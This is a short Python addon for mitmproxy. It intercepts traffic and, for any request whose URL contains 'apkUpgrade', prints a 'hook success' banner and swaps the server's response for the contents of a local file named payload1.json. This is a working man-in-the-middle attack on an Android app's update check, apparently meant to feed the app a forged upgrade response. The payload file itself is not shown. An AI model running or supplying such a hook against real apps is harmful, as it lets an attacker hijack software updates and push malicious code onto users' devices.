from mitmproxy import ctx,http
import json,os
class ModifyResponse:
    def response(self,flow):
        if "apkUpgrade" in flow.request.url:
            print("|---------------------------------|")
            print("|                                 |")
            print("|           hook success          |")
            print("|                                 |")
            print("|---------------------------------|")
            with open('payload1.json','rb') as f:
                res = json.load(f)
            flow.response.set_text(json.dumps(res))

addons = [
    ModifyResponse()
]
